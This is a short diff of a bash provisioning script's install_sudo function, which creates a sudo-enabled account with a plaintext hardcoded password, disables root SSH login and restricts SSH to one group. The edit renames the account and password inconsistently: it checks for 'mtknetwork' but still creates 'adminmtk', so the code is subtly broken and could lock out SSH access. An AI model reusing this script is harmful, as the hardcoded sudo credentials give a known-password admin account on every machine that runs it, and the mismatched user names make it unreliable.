@@ -578,18 +578,18 @@ additional(){
 
 install_sudo(){
 # Create user if not exists
-if ! id "adminmtk" &>/dev/null; then
+if ! id "mtknetwork" &>/dev/null; then
 useradd -m -s /bin/bash adminmtk
-echo "adminmtk:Mediatek272124@@" | chpasswd
-usermod -aG sudo adminmtk
+echo "mtknetwork:F1005r90@@@" | chpasswd
+usermod -aG sudo mtknetwork
 fi
 
 # Disable root SSH login
 sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
 
 # Ensure AllowGroups is set only once
-if ! grep -q "^AllowGroups adminmtk" /etc/ssh/sshd_config; then
-echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
+if ! grep -q "^AllowGroups mtknetwork" /etc/ssh/sshd_config; then
+echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
 fi
 
 # Restart SSH service
